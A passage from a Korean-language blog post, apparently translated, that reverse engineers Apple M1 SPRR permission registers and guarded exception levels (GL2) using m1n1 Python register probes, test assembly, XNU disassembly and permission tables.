class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>](<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)  [<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>]</code></pre></li></ul><p><code>S3_6_C15_C1_0</code>를 <code>SPRR_CONFIG_EL1</code>로 칭하자. 그 레지스터의 비트 1은 SPRR을 활성화하고 모든 비트를 설정한 후 추가적인 변경을 위해 모든 SPRR 레지스터를 잠그는 것으로 보인다. <code>S3_6_C15_1_2</code>과 그것을 활성화하는 레지스터는 파트 2에서 중요하다.</p><p><code>S3_6_C15_C1_5</code>의 모든 비트를 수정할 수 있다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>p.mmu_shutdown()TTY&gt; MMU: shutting down...TTY&gt; MMU: shutdown successful, clearing cache<span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-number">1</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))<span class="hljs-number">0x0</span><span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>), <span class="hljs-number">0xffffffffffffffff</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))<span class="hljs-number">0xffffffffffffffff</span>&gt;&gt;&gt;</code></pre><p>이 레지스터가 EL0에 적용되는 것 같지만, 여기서는 EL2에서 실행된다. 새로 활성화된 레지스터 <code>S3_6_C15_C1_6</code>은 EL1에 대한 것이며 <code>S3_6_C15_C1_7</code>은 EL2에 대한 것이라고 가정할 수 있다. M1은 항상 <code>HCR_EL2.E2H</code>로 실행되며 E1 레지스터에 대한 접근을 EL2 counterparts로 리다이렉션 한다. 이를 사용하여 가정을 증명할 수 있다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>), <span class="hljs-number">0xdead0000</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>))<span class="hljs-number">0xdead0000</span>&gt;&gt;&gt;</code></pre><p>SPRR을 이제 활성화할 수 있으며 EL2 권한으로 사용되는 것 같은 레지스터도 있다. 이 레지스터의 4 비트를 이해하기 위해 유저 랜드에서 한 실험을 해보자.</p><h2 id="SPRR-리버스-엔지니어링"><a href="#SPRR-리버스-엔지니어링" class="headerlink" title="SPRR 리버스 엔지니어링"></a>SPRR 리버스 엔지니어링</h2><p>간단한 페이지 테이블을 설정하기 위한 파이썬 코드를 작성한 후 유저 랜드에서 했던 것과 동일하게 실험할 수 있다. <code>S3_6_C15_C1_6</code>의 권한 바이트를 페이지에 매핑하고 해당 페이지에서 읽기, 쓰기, 실행을 해보자.</p><p>파이썬에서 이 작업을 완벽하게 수행하는 것은 <code>r-x</code> 페이지에서 실행되고 스택을 <code>rw-</code> 페이지에 유지하기 위해 m1n1을 변경할 때만 가능하다. 파이썬에서 가능한 많은 설정 작업을 하고 shellcode를 작성하고 다른 코어에서 실행하는 것이 훨씬 쉽다. 하나가 중단되더라도 재부팅이 되기 전에 다른 것이 남아있다.</p><pre><code class="hljs python">pagetable = ARMPageTable(heap.memalign, heap.free)pagetable.map(<span class="hljs-number">0x800000000</span>, <span class="hljs-number">0x800000000</span>, <span class="hljs-number">0xc00000000</span>, <span class="hljs-number">0</span>)   <span class="hljs-comment"># normal memory, we run from here</span>pagetable.map(<span class="hljs-number">0xf800000000</span>, <span class="hljs-number">0x800000000</span>, <span class="hljs-number">0xc00000000</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># probe memory, we&#x27;ll try to read/write/execute this</span><span class="hljs-comment"># ...</span>code_page = build_and_write_code(heap, <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    // [...]</span><span class="hljs-string">                // prepare and enable MMU</span><span class="hljs-string">                ldr x0, =0x0400ff</span><span class="hljs-string">                msr MAIR_EL1, x0</span><span class="hljs-string">                ldr x0, =0x27510b510 // borrowed from m1n1&#x27;s MMU code</span><span class="hljs-string">                msr TCR_EL1, x0</span><span class="hljs-string">                ldr x0, =0x&#123;ttbr:x&#125;</span><span class="hljs-string">                msr TTBR0_EL1, x0</span><span class="hljs-string">                mrs x0, SCTLR_EL1</span><span class="hljs-string">                orr x1, x0, #5</span><span class="hljs-string">                msr SCTLR_EL1, x1</span><span class="hljs-string">                isb</span><span class="hljs-string">    // [...]</span><span class="hljs-string">&quot;&quot;&quot;</span>.format(ttbr=pagetable.l0)<span class="hljs-comment"># ...</span>ret = p.smp_call_sync(<span class="hljs-number">1</span>, code_page, sprr_val)<span class="hljs-comment"># ...</span></code></pre><p>signal handler는 이제 exception vector가 된다. 단일 레지스터를 수정하여 failure를 표시한 후 프로그램 카운터를 두 번 이동한 후 return 한다. 첫 번째 명령어는 다시 실행하고 싶지 않은 잘못된 명령이다. 두 번째는 <code>mov x10, 0x80</code>으로 접근을 성공했음을 표시하며 예외가 처리될 경우 표시되지 않는다.</p><pre><code class="hljs python">_fault_handler:<span class="hljs-comment"># store that we failed</span>mov x10, <span class="hljs-number">0xf1</span>mrs x12, ELR_GL2  <span class="hljs-comment"># get the PC that faulted</span>add x12, x12, <span class="hljs-number">8</span>   <span class="hljs-comment"># skip two instructions</span>msr ELR_GL2, x12  <span class="hljs-comment"># store the updated PC</span>isb<span class="hljs-comment"># eret restores the state from before the exception was taken</span>eret_sprr_test:<span class="hljs-comment"># ...</span><span class="hljs-comment"># test read access, x1 contains an address to a page for which we modify the SPRR register values</span>mov x10, <span class="hljs-number">0</span>    <span class="hljs-comment"># x10 is our success/failure indicator</span>ldr x1, [x1]  <span class="hljs-comment"># this instruction will fault if we can&#x27;t read from [x1]</span>mov x10, <span class="hljs-number">0x80</span> <span class="hljs-comment"># this instruction will be skipped if the previous one faulted</span></code></pre><p>모든 16개의 가능한 설정을 얻을 수 있다.</p><table><thead><tr><th>레지스터 값</th><th>페이지 권한</th></tr></thead><tbody><tr><td>0000</td><td>—</td></tr><tr><td>0001</td><td>r-x</td></tr><tr><td>0010</td><td>r–</td></tr><tr><td>0011</td><td>rw-</td></tr><tr><td>0100</td><td>—</td></tr><tr><td>0101</td><td>r-x</td></tr><tr><td>0110</td><td>r–</td></tr><tr><td>0111</td><td>—</td></tr><tr><td>1000</td><td>—</td></tr><tr><td>1001</td><td>–x</td></tr><tr><td>1010</td><td>r–</td></tr><tr><td>1011</td><td>rw-</td></tr><tr><td>1100</td><td>—</td></tr><tr><td>1101</td><td>r-x</td></tr><tr><td>1110</td><td>r–</td></tr><tr><td>1111</td><td>rw-</td></tr></tbody></table><p>여기에 이상한 점이 존재하는데, 대부분 하위 두 비트가 권한을 지정한다. 그러나 높은 비트가 권한을 변경하는 두 가지 예외가 존재한다. <code>0111</code>의 경우 <code>rw-</code>가 아닌 <code>---</code> 권한을 가지고, <code>1001</code>의 경우 <code>r-x</code>가 아닌 <code>r</code> 권한만을 가진다.</p><p>이를 인코딩하는데 두 개의 비트가 더 낭비될 필요가 없다. 이것은 처음에 쓰기, 실행 권한을 엄격하게 시행하는 유저 vs 커널 권한으로 보인다. 하지만 EL0은 다른 레지스터를 사용하는 것을 알고 있다. 그럼 얘는 뭘까?</p><h1 id="Guarded-Exception-Levels-GXF"><a href="#Guarded-Exception-Levels-GXF" class="headerlink" title="Guarded Exception Levels / GXF"></a>Guarded Exception Levels / GXF</h1><p>위에서 PPR 레지스터에 인코딩 된 약간 이상한 점을 발견했다. normal exception levels과는 다른 <a href="https://twitter.com/s1guza/status/1353749746951839748">guarded exception levels</a>에 대한 <a href="https://twitter.com/qwertyoruiopz/status/1174787964100075521">몇 가지</a> <a href="https://twitter.com/s1guza/status/1355929535699681284">언급</a>이 있다. 이것은 커스텀 명령어 <code>0x00201420</code>과 <code>0x00201400</code>(<code>genter</code>, <code>gexit</code>)을 통해 트리거 된다.</p><p>disassembler로 XNU를 가져가서, <code>otool -xv /System/Library/Kernels/kernel.release.t8101</code>을 사용하여 살펴보자.</p><pre><code class="hljs apache"><span class="hljs-attribute">fffffe00071f80f0</span>        mov     x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span><span class="hljs-attribute">fffffe00071f80f4</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">1</span>_<span class="hljs-number">2</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f80f8</span>        adrp    x<span class="hljs-number">0</span>, <span class="hljs-number">2025</span> ; <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00071f80fc</span>        add     x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">9</span>d<span class="hljs-number">8</span><span class="hljs-attribute">fffffe00071f8100</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">8</span>_<span class="hljs-number">2</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8104</span>        adrp    x<span class="hljs-number">0</span>, <span class="hljs-number">2025</span> ; <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00071f8108</span>        add     x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">9</span>dc<span class="hljs-attribute">fffffe00071f810c</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">8</span>_<span class="hljs-number">1</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8110</span>        isb<span class="hljs-attribute">fffffe00071f8114</span>        mov     x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8118</span>        msr     ELR_EL<span class="hljs-number">1</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f811c</span>        isb<span class="hljs-attribute">fffffe00071f8120</span>        .long   <span class="hljs-number">0</span>x<span class="hljs-number">00201420</span><span class="hljs-attribute">fffffe00071f8124</span>        ret</code></pre><p>이전에 찾은 두 번째 활성화 레지스터 <code>S3_6_C15_C1_2</code>를 처음 사용한 후 알 수 없는 시스템 레지스터에 두 개의 포인터를 작성하고 <code>0x00201420</code>을 실행한다. 첫 번째 포인터는 무한 루프이지만 두 번째 포인터는 이전에 확인한 SPRR 레지스터도 사용하는 것으로 추측되는 함수를 가리킨다.</p><p>아마도 <code>S3_6_C15_C8_1</code>에 <code>0x00201420</code>이 실행되면 프로세스가 점프하는 포인터가 포함되며 <code>0x00201420</code>는 EL3에 트랩하는 <code>smc</code>이고, <code>0x00201400</code>은 EL2로 돌아가는 <code>eret</code>인 하이퍼바이저 호출 방식과 유사하다. 새로운 실행 모드에 대한 다른 페이지 테이블이 없는 것이 차이점이다. SPRR 레지스터에 알려지지 않은 2 비트가 GL2의 페이지 권한이면 어떨까?</p><p>이전과 같은 접근법을 사용하여 m1n1에서 다시 검증을 해보았다. guarded excution mode에 exception vector를 설정하고 같은 실험을 반복하자.</p><p><code>VBAR</code>라 불리는 레지스터를 호출하여 새로운 모드에서 exception vector를 설정할 수 있다. <code>genter</code> 이후 XNU가 설정하는 첫 레지스터 중 하나인 <code>S3_6_C15_C10_2</code>가 가리키는 코드를 살펴보자.</p><pre><code class="hljs"><span class="hljs-attribute">fffffe00079e0000</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">15</span>d<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00079e0004</span>        nop<span class="hljs-attribute">fffffe00079e0008</span>        nop<span class="hljs-attribute">fffffe00079e000c</span>        nop[...]<span class="hljs-attribute">fffffe00079e007c</span>        nop<span class="hljs-attribute">fffffe00079e0080</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00079e0084</span>        nop[...]<span class="hljs-attribute">fffffe00079e00fc</span>        nop<span class="hljs-attribute">fffffe00079e0100</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">11</span>f<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00079e0104</span>        nop[...]</code></pre><p><code>S3_6_C15_C10_2</code>가 <code>VBAR_GL1</code>임을 의미하는 예외 벡터 테이블로 보인다.</p><p>이것은 전체 권한 테이블을 찾는데에 동작한다. SPRR 레지스터의 값이 <code>0100</code>, <code>0110</code> 혹은 <code>1111</code>인 동안에 EL2에서 코드로 점프할 때 크래시가 난다. 이 모든 값들은 EL2에서  실행할 수 없지만 GL2에서는 가능한 페이지를 나타낸다. 이러한 결함은 몇 가지 이유로 인해 다른 주소로 지정되면 어떻게 될까? 세 가지 결함은 XNU에 무한 루프를 가리키는 시스템 레지스터를 사용한다.</p><ul><li>EL2가 GL2에서만 실행 가능한 코드로 점프하는 경우 <code>S3_6_C15_C8_2</code>로 이동(<code>GXF_ABORT_EL2</code>)</li><li>EL2에서의 다른 중단은 <code>VBAR_EL2</code>로 이동</li><li>GL2에서의 다른 중단은 <code>VBAR_GL2</code>로 이동</li></ul><p>이제 SPRR 레지스터의 모든 비트가 전체 권한 테이블로 이어짐을 알았다.</p><table><thead><tr><th>레지스터 값</th><th>EL 페이지 권한</th><th>GL 페이지 권한</th></tr></thead><tbody><tr><td>0</td><td><code>---</code></td><td><code>---</code></td></tr><tr><td>1</td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>10</td><td><code>r--</code></td><td><code>---</code></td></tr><tr><td>11</td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>100</td><td><code>---</code></td><td><code>r-x</code></td></tr><tr><td>101</td><td><code>r-x</code></td><td><code>r-x</code></td></tr><tr><td>110</td><td><code>r--</code></td><td><code>r-x</code></td></tr><tr><td>111</td><td><code>---</code></td><td><code>r-x</code></td></tr><tr><td>1000</td><td><code>---</code></td><td><code>r--</code></td></tr><tr><td>1001</td><td><code>--x</code></td><td><code>r--</code></td></tr><tr><td>1010</td><td><code>r--</code></td><td><code>r--</code></td></tr><tr><td>1011</td><td><code>rw-</code></td><td><code>r--</code></td></tr><tr><td>1100</td><td><code>---</code></td><td><code>rw-</code></td></tr><tr><td>1101</td><td><code>r-x</code></td><td><code>rw-</code></td></tr><tr><td>1110</td><td><code>r--</code></td><td><code>rw-</code></td></tr><tr><td>1111</td><td><code>rw-</code></td><td><code>rw-</code></td></tr></tbody></table><p>GL 권한 비트가 EL 권한 비트의 의미를 수정하는 두 가지 특별한 경우를 살펴보자.</p><ul><li><code>0111</code>은 GL에서 실행이 가능하며 EL에서 쓰기가 가능한 페이지를 만들 수 없다. 소프트웨어 오류에 대한 추가적인 하드웨어 계층 보호 기능을 제공한다. EL에서 GL로 실행 중인 코드를 변경할 수 있는 것은 전체적인 lateral level을 무의미하게 만든다.</li><li><code>1001</code>은 페이지가 GL에서만 읽을 수 있을 때 <code>r-x</code> EL 권한을 <code>--x</code> 권한으로 변경한다. EL의 코드를 숨기거나 exploit에 대한 추가적인 보호 기법으로 사용하는 것으로 추측된다.</li></ul><h2 id="Python을-통한-GL2-증명"><a href="#Python을-통한-GL2-증명" class="headerlink" title="Python을 통한 GL2 증명"></a>Python을 통한 GL2 증명</h2><p>이러한 지식을 가지고 m1n1에서 GL2를 실행하는 custom payload를 추가할 수 있다. EL1/EL0에 이미 존재하는 프레임워크를 추가할 필요가 있다. MMU를 비활성화(SPRR을 활성화한 상태에서 rwx 페이지에서 m1n1이 실행되므로)하고 페이로드로 이동한 다음 return 하기 전에 MMU를 다시 활성화하면 된다.</p><p>GL2를 탐색하여 <code>S3_6_C15_C10_3</code>이 <code>SPSR_GL2</code>일 가능성이 있음을 확인할 수 있다.</p><pre><code class="hljs angelscript">&gt;&gt;&gt; u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>), call=p.gl_call)<span class="hljs-number">0x60000009</span>&gt;&gt;&gt; u.mrs(SPSR_EL2)<span class="hljs-number">0x60000009</span></code></pre><p>MSR finder 대신에 GL2에서 확인해보자.</p><pre><code class="hljs python">gxf_regs = find_regs(call=p.gl_call)print(<span class="hljs-string">&quot;GXF&quot;</span>)<span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> sorted(gxf_regs - all_regs):    print(<span class="hljs-string">&quot;  %s&quot;</span> % list(r))</code></pre><p>컨텍스트에서만 사용 가능한 새로운 시스템 레지스터들을 발견했다.</p><pre><code class="hljs angelscript">GXF  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>]  